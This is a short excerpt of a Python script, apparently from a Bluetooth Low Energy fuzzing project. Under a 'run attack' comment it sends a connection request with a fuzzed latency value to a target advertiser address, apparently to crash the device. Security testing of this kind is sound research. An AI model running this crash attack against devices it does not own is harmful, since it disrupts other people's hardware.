...
if args_len < 3:
    sys.exit("Too few arguments provided.\nUsage: python3 connection_latency_crash.py 'serial_port' 'advertiser_address', ['pcap_filename']")
...
if args_len == 4:
    ...
    pcap_filename = 'connection_latency_crash_log'
...
# run attack
ble_sul.scan_req()
latency = FuzzedParam("latency", 1000) 
ble_sul.connection_request_fuzzed(latency)
ble_sul.termination_indication()
